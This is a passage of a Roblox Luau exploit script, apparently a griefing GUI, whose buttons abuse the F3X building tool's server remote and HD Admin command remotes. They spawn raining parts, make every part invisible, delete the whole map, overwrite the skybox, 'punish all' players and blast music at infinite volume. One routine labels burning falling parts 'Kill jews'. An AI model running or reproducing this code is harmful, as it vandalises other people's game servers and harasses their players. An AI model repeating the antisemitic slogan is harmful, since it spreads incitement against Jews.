			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
	
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = workspace.Part
				},
				[3] = stringg
			}
			_(args)
		end
	
		function Sky(id)
			local hrp = char:WaitForChild("HumanoidRootPart")
			local cf = hrp.CFrame
			CreatePart(CFrame.new(cf.Position + Vector3.new(0, 6, 0)), workspace)
			for _, v in workspace:GetDescendants() do
				if v:IsA("BasePart") and v.CFrame.Position == cf.Position + Vector3.new(0, 6, 0) then
					SetAnchor(true, v)
					AddMesh(v)
					SetMesh(v, "111891702759441")
					SetTexture(v, id)
					MeshResize(v, Vector3.new(8000, 8000, 8000))
				end
			end
		end
	
		local function createRainToads()
			while true do
				wait(0.001)
				if player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Health > 0 then
					local hrpcf = player.Character.HumanoidRootPart.CFrame
					local x = hrpcf.x
					local z = hrpcf.z
					local randint = math.random(-600, 600)
					local randint2 = math.random(-600, 600)
					local xloc = randint + x
					local zloc = randint2 + z
					local cf = player.Character.HumanoidRootPart.CFrame.y + 800  
	
					spawn(function()
						local newToad = CreatePart(CFrame.new(math.floor(xloc), math.random(cf, cf + 400), math.floor(zloc)), workspace)
						for i, v in game.Workspace:GetDescendants() do
							if v.Name == "Part" and v.Parent == workspace and v.CFrame.x == math.floor(xloc) and v.CFrame.z == math.floor(zloc) then
								spawn(function()
									SetName(v, "Taco")
								end)
								spawn(function()
									SetAnchor(false, v)
								end)
								spawn(function()
									AddMesh(v)
								end)
								spawn(function()
									MeshResize(v, Vector3.new(20, 20, 20))
								end)
								spawn(function()
									SetMesh(v, "2053554988")
								end)
								spawn(function()
									SetTexture(v, "2053555006")
								end)
								spawn(function()
									SetCollision(v, false)
								end)
								spawn(function()
									MovePart(v, v.CFrame * CFrame.new(
										math.random(-5, 5), 
										math.random(0, 10), 
										math.random(-5, 5) 
										) * CFrame.Angles(
											math.rad(math.random(10, 180)),
											math.rad(math.random(10, 180)),
											math.rad(math.random(10, 180))
										))
	
								end)
	
	
	
							end
						end
					end)
				else
					wait(1)
				end
			end
		end
	
		coroutine.wrap(createRainToads)()
	
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
	
		for i, v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
	
		for i, v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
	
		local remote = tool.SyncAPI.ServerEndpoint
	
		function _(args)
			remote:InvokeServer(unpack(args))
		end
	
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
	end)
end;
task.spawn(C_51);
-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton.LocalScript
local function C_53()
local script = G2L["53"];
	script.Parent.MouseButton1Click:Connect(function()
	
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
	
		-- Raining tacos, credits to original author: ItsKittyyyGD
	
		local player = game.Players.LocalPlayer
		local char = player.Character or player.CharacterAdded:Wait()
		local tool
	
		for i, v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
	
		for i, v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
	
		local remote = tool.SyncAPI.ServerEndpoint
	
		function _(args)
			remote:InvokeServer(unpack(args))
		end
	
		function SetCollision(part, boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean, part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
	
		function CreatePart(cf, parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
	
		function Resize(part, size, cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
	
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part, meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://" .. meshid
					}
				}
			}
			_(args)
		end
	
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://" .. texid
					}
				}
			}
			_(args)
		end
	
		function MeshResize(part, size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
	
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = workspace.Part
				},
				[3] = stringg
			}
			_(args)
		end
	
		function Sky(id)
			local hrp = char:WaitForChild("HumanoidRootPart")
			local cf = hrp.CFrame
			CreatePart(CFrame.new(cf.Position + Vector3.new(0, 6, 0)), workspace)
			for _, v in workspace:GetDescendants() do
				if v:IsA("BasePart") and v.CFrame.Position == cf.Position + Vector3.new(0, 6, 0) then
					SetAnchor(true, v)
					AddMesh(v)
					SetMesh(v, "111891702759441")
					SetTexture(v, id)
					MeshResize(v, Vector3.new(8000, 8000, 8000))
				end
			end
		end
	
		local function createRainToads()
			while true do
				wait(0.001)
				if player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Health > 0 then
					local hrpcf = player.Character.HumanoidRootPart.CFrame
					local x = hrpcf.x
					local z = hrpcf.z
					local randint = math.random(-600, 600)
					local randint2 = math.random(-600, 600)
					local xloc = randint + x
					local zloc = randint2 + z
					local cf = player.Character.HumanoidRootPart.CFrame.y + 800  
	
					spawn(function()
						local newToad = CreatePart(CFrame.new(math.floor(xloc), math.random(cf, cf + 400), math.floor(zloc)), workspace)
						for i, v in game.Workspace:GetDescendants() do
							if v.Name == "Part" and v.Parent == workspace and v.CFrame.x == math.floor(xloc) and v.CFrame.z == math.floor(zloc) then
								spawn(function()
									SetName(v, "Taco")
								end)
								spawn(function()
									SetAnchor(false, v)
								end)
								spawn(function()
									AddMesh(v)
								end)
								spawn(function()
									MeshResize(v, Vector3.new(20, 20, 20))
								end)
								spawn(function()
									SetMesh(v, "72429843683785")
								end)
								spawn(function()
									SetTexture(v, "132235832046957")
								end)
								spawn(function()
									SetCollision(v, false)
								end)
								spawn(function()
									MovePart(v, v.CFrame * CFrame.new(
										math.random(-5, 5), 
										math.random(0, 10), 
										math.random(-5, 5) 
										) * CFrame.Angles(
											math.rad(math.random(10, 180)),
											math.rad(math.random(10, 180)),
											math.rad(math.random(10, 180))
										))
	
								end)
	
	
	
							end
						end
					end)
				else
					wait(1)
				end
			end
		end
	
		coroutine.wrap(createRainToads)()
	
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
	
		for i, v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
	
		for i, v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
	
		local remote = tool.SyncAPI.ServerEndpoint
	
		function _(args)
			remote:InvokeServer(unpack(args))
		end
	
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
	end)
end;
task.spawn(C_53);
-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton.LocalScript
local function C_55()
local script = G2L["55"];
	script.Parent.MouseButton1Click:Connect(function()
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
	
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
		function Color(part,color)
			local args = {
				[1] = "SyncColor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Color"] = color --[[Color3]],
						["UnionColoring"] = false
					}
				}
			}
			_(args)
		end
		function SpawnDecal(part,side)
			local args = {
				[1] = "CreateTextures",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal"
					}
				}
			}
	
			_(args)
		end
		function AddDecal(part,asset,side)
			local args = {
				[1] = "SyncTexture",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal",
						["Texture"] = "rbxassetid://".. asset
					}
				}
			}
			_(args)
		end
	
		function spam(id)
			for i,v in game.workspace:GetDescendants() do
				if v:IsA("BasePart") then
					spawn(function()
						SetTrans(v,math.random(1,1))
					end)
				end
			end 
		end
		spam("72497671152590")
	
	end)
end;
task.spawn(C_55);
-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton.LocalScript
local function C_57()
local script = G2L["57"];
	script.Parent.MouseButton1Click:Connect(function()
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
	
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
		function Color(part,color)
			local args = {
				[1] = "SyncColor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Color"] = color --[[Color3]],
						["UnionColoring"] = false
					}
				}
			}
			_(args)
		end
		function SpawnDecal(part,side)
			local args = {
				[1] = "CreateTextures",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal"
					}
				}
			}
	
			_(args)
		end
		function AddDecal(part,asset,side)
			local args = {
				[1] = "SyncTexture",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal",
						["Texture"] = "rbxassetid://".. asset
					}
				}
			}
			_(args)
		end
	
		function spam(id)
			for i,v in game.workspace:GetDescendants() do
				if v:IsA("BasePart") then
					spawn(function()
						SetTrans(v,math.random(0,0))
					end)
				end
			end 
		end
		spam("72497671152590")
	
	
	end)
end;
task.spawn(C_57);
-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton.LocalScript
local function C_59()
local script = G2L["59"];
	script.Parent.MouseButton1Click:Connect(function()
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
	
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
		function Color(part,color)
			local args = {
				[1] = "SyncColor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Color"] = color --[[Color3]],
						["UnionColoring"] = false
					}
				}
			}
			_(args)
		end
		function SpawnDecal(part,side)
			local args = {
				[1] = "CreateTextures",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal"
					}
				}
			}
	
			_(args)
		end
		function AddDecal(part,asset,side)
			local args = {
				[1] = "SyncTexture",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal",
						["Texture"] = "rbxassetid://".. asset
					}
				}
			}
			_(args)
		end
	
		function spam(id)
			for i,v in game.workspace:GetDescendants() do
				if v:IsA("BasePart") then
					spawn(function()
						SetTrans(v,math.random(0,1))
					end)
				end
			end 
		end
		spam("72497671152590")
	
	
	end)
end;
task.spawn(C_59);
-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton.LocalScript
local function C_5b()
local script = G2L["5b"];
	script.Parent.MouseButton1Click:Connect(function()
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
	
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
				break
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
				break
			end
		end
	
		if not tool then return end
	
		local remote = tool.SyncAPI.ServerEndpoint
	
		function _(args)
			remote:InvokeServer(unpack(args))
		end
	
		function DestroyPart(part)
			local args = {[1]="Remove",[2]={[1]=part}}
			_(args)
		end
	
		function CreatePart(cf,parent)
			local args = {[1]="CreatePart",[2]="Normal",[3]=cf,[4]=parent}
			_(args)
		end
	
		function AddMesh(part)
			local args = {[1]="CreateMeshes",[2]={[1]={["Part"]=part}}}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {[1]="SyncMesh",[2]={[1]={["Part"]=part,["MeshId"]="rbxassetid://"..meshid}}}
			_(args)
		end
	
		function SetTexture(part, texid)
			local args = {[1]="SyncMesh",[2]={[1]={["Part"]=part,["TextureId"]="rbxassetid://"..texid}}}
			_(args)
		end
	
		function SetName(part, stringg)
			local args = {[1]="SetName",[2]={[1]=part},[3]=stringg}
			_(args)
		end
	
		function MeshResize(part,size)
			local args = {[1]="SyncMesh",[2]={[1]={["Part"]=part,["Scale"]=size}}}
			_(args)
		end
	
		function SetLocked(part,boolean)
			local args = {[1]="SetLocked",[2]={[1]=part},[3]=boolean}
			_(args)
		end
	
		for _, obj in pairs(game.Workspace:GetDescendants()) do
			if obj:IsA("BasePart") and not obj.Parent:FindFirstChild("Humanoid") then
				task.spawn(function()
					pcall(function()
						DestroyPart(obj)
					end)
				end)
			end
		end
	
		wait(2)
	
		local e = char.HumanoidRootPart.CFrame.x
		local f = char.HumanoidRootPart.CFrame.y
		local g = char.HumanoidRootPart.CFrame.z
		CreatePart(CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,6,0),workspace)
		wait(0.1)
	
		local skyboxPart
		for i,v in game.Workspace:GetDescendants() do
			if v:IsA("BasePart") and v.CFrame.x == math.floor(e) and v.CFrame.z == math.floor(g) then
				skyboxPart = v
				SetName(v,"Sky")
				AddMesh(v)
				SetMesh(v,"111891702759441")
				SetTexture(v,"129410413224556")
				MeshResize(v,Vector3.new(70000,70000,70000))
				SetLocked(v,true)
				break
			end
		end
	
		if skyboxPart then
			task.spawn(function()
				while true do
					local waitTime = math.random(20, 40) / 10
					wait(waitTime)
	
					SetTexture(skyboxPart, "129410413224556")
					wait(0.1)
					SetTexture(skyboxPart, "10366172875")
					wait(0.1)
					SetTexture(skyboxPart, "129410413224556")
				end
			end)
		end
	
	end)
end;
task.spawn(C_5b);
-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton.LocalScript
local function C_5c()
local script = G2L["5c"];
	script.Parent.MouseButton1Click:Connect(function()
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand
		RequestCommand:InvokeServer(";punish all")
	
	end)
end;
task.spawn(C_5c);
-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton.LocalScript
local function C_5d()
local script = G2L["5d"];
	script.Parent.MouseButton1Click:Connect(function()
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		wait(2)
		RequestCommand:InvokeServer(";music 115190083295451 ;pitch 0.2 ;volume inf")
	
	end)
end;
task.spawn(C_5d);
-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton.LocalScript
local function C_5f()
local script = G2L["5f"];
	script.Parent.MouseButton1Click:Connect(function()
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		RequestCommand:InvokeServer(";Punish all")
		wait(1)
		RequestCommand:InvokeServer(";sm Get Toadroasted by Coikax NUB")
		
		local player = game.Players.LocalPlayer
		local char = player.Character or player.CharacterAdded:Wait()
		local tool
	
		for i, v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
	
		for i, v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
	
		local remote = tool.SyncAPI.ServerEndpoint
	
		function _(args)
			remote:InvokeServer(unpack(args))
		end
	
		function SetCollision(part, boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
	
		function SetAnchor(boolean, part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
	
		function CreatePart(cf)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = workspace
			}
			_(args)
		end
	
		function Resize(part, size, cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
	
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part, meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://" .. meshid
					}
				}
			}
			_(args)
		end
	
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://" .. texid
					}
				}
			}
			_(args)
		end
	
		function MeshResize(part, size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
	
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = workspace.Part
				},
				[3] = stringg
			}
			_(args)
		end
	
		function CreateFire(part)
			local args = {
				[1] = "CreateDecorations",
				[2] = {
					[1] = {
						["Part"] = part,
						["DecorationType"] = "Fire"
					}
				}
			}
			_(args)
		end
	
		function SyncFire(part, size, heat)
			local args = {
				[1] = "SyncDecorate",
				[2] = {
					[1] = {
						["Part"] = part,
						["DecorationType"] = "Fire",
						["Size"] = size,
						["Heat"] = heat
					}
				}
			}
			_(args)
		end
	
		function Sky(id)
			local hrp = char:WaitForChild("HumanoidRootPart")
			local cf = hrp.CFrame
			CreatePart(CFrame.new(cf.Position + Vector3.new(0, 6, 0)))
			for _, v in workspace:GetDescendants() do
				if v:IsA("BasePart") and v.CFrame.Position == cf.Position + Vector3.new(0, 6, 0) then
					SetAnchor(true, v)
					AddMesh(v)
					SetMesh(v, "116114045088190")
					SetTexture(v, id)
					MeshResize(v, Vector3.new(0, 0, 0))
				end
			end
		end
	
		local function createRainToads()
			while true do
				wait(0.01)
				if player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Health > 0 then
					local hrpcf = player.Character.HumanoidRootPart.CFrame
					local x = hrpcf.x
					local z = hrpcf.z
					local randint = math.random(-600, 600)
					local randint2 = math.random(-600, 600)
					local xloc = randint + x
					local zloc = randint2 + z
					local cf = player.Character.HumanoidRootPart.CFrame.y + 400
	
					spawn(function()
						local newToad = CreatePart(CFrame.new(math.floor(xloc), math.random(cf, cf + 400), math.floor(zloc)))
						for i, v in game.Workspace:GetDescendants() do
							if v.Name == "Part" and v.Parent == workspace and v.CFrame.x == math.floor(xloc) and v.CFrame.z == math.floor(zloc) then
								SetName(v, "Kill jews")
								SetAnchor(false, v)
								AddMesh(v)
								Resize(v, Vector3.new(8, 8, 8), v.CFrame)
								MeshResize(v, Vector3.new(4, 4, 4))
								SetMesh(v, "1009824073")
								SetTexture(v, "1009824086")
								SetCollision(v, true)
								v.Orientation = Vector3.new(0, 0, 0)
								v.CFrame = v.CFrame + Vector3.new(0, 0, 0)
	
								CreateFire(v)
								wait(0.05)
								SyncFire(v, 30, 25)
	
								local sound = Instance.new("Sound", v)
								sound.SoundId = "rbxassetid://153752123"
								sound.Volume = 0
								sound.PlayOnRemove = true
								sound:Destroy()
							end
						end
					end)
				else
					wait(1)
				end
			end
		end
	
		coroutine.wrap(createRainToads)()
	
		Sky("95921788891849")
	end)
end;
task.spawn(C_5f);
-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton.LocalScript
local function C_61()
local script = G2L["61"];
	script.Parent.MouseButton1Click:Connect(function()
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
	
		for _, v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
	
		if not tool then
			for _, v in game.ReplicatedStorage:GetDescendants() do
				if v.Name == "SyncAPI" then
					tool = v.Parent
				end
			end
		end
	
		if not tool then
			warn("F3X tool not found!")
			return
		end
	
		local remote = tool.SyncAPI.ServerEndpoint
	
		local function invokeRemote(args)
			remote:InvokeServer(unpack(args))
		end
	
		local function SetCollision(part, boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
